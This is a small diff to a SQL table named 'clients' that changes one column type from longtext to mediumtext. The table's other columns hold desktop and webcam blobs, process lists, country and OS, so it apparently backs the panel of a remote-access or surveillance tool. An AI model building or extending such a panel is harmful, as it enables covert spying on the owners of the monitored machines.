@@ -37,7 +37,7 @@ CREATE TABLE `clients` (
   `desktop` longblob NOT NULL,
   `pclist` longtext NOT NULL,
   `status` text NOT NULL,
-  `idle` longtext NOT NULL,
+  `idle` mediumtext NOT NULL,
   `country` varchar(255) NOT NULL,
   `os` varchar(255) NOT NULL,
   `webcam` longblob NOT NULL
